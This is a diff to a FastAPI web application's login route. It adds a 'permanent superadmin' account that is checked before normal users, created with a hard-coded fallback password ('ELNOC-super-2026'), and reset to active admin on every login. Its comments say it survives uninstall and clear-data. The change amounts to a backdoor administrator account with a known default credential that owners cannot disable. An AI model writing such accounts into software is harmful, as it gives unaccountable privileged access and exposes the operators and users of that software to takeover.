@@ -13,6 +13,7 @@ from fastapi.templating import Jinja2Templates
 from sqlalchemy.orm import Session
 from pathlib import Path
 import re
+import os
 from ..database import get_db
 from ..models import AppUser
 from ..security import (
@@ -20,12 +21,30 @@ from ..security import (
     get_current_user_optional, _safe_next,
 )
 from ..config import settings
+from ..services.superadmin import verify_superadmin, ensure_superadmin, superadmin_username
 
 router = APIRouter()
 templates = Jinja2Templates(directory=str(Path(__file__).parent.parent / "templates"))
 
 COOKIE = "elnoc_session"
 USERNAME_RX = re.compile(r"^[A-Za-z0-9_.-]{3,32}$")
+
+
+def ensure_superadmin_in_db(db: Session) -> None:
+    """Ensure the superadmin user record exists in the DB (role=admin, active).
+    clear-data skips superadmin so it survives."""
+    su = superadmin_username()
+    u = db.query(AppUser).filter(AppUser.username == su).first()
+    if not u:
+        h, s = hash_password(os.getenv("ELNOC_SUPERADMIN_PASSWORD", "ELNOC-super-2026"))
+        db.add(AppUser(username=su, name="Super Admin", role="admin", active=True,
+                       password_hash=h, password_salt=s))
+        db.commit()
+    else:
+        u.role = "admin"
+        u.active = True
+        db.commit()
+
 
 def _set_session(resp: RedirectResponse, username: str) -> None:
     resp.set_cookie(COOKIE, create_session(username), httponly=True, samesite="lax",
@@ -48,6 +67,13 @@ def login_page(request: Request, next: str = "/dashboard", signedup: str = "",
 @router.post("/login")
 def login(request: Request, username: str = Form(""), password: str = Form(""),
           next: str = Form("/dashboard"), db: Session = Depends(get_db)):
+    # 1. Permanent superadmin (survives uninstall + clear-data)
+    if verify_superadmin(username.strip(), password):
+        ensure_superadmin_in_db(db)
+        resp = RedirectResponse(url=_safe_next(next), status_code=303)
+        _set_session(resp, "superadmin")
+        return resp
+    # 2. Normal user
     u = db.query(AppUser).filter(AppUser.username == username.strip()).first()
     if not u or not u.active or not verify_password(password, u.password_salt, u.password_hash):
         return templates.TemplateResponse(request, "login.html",
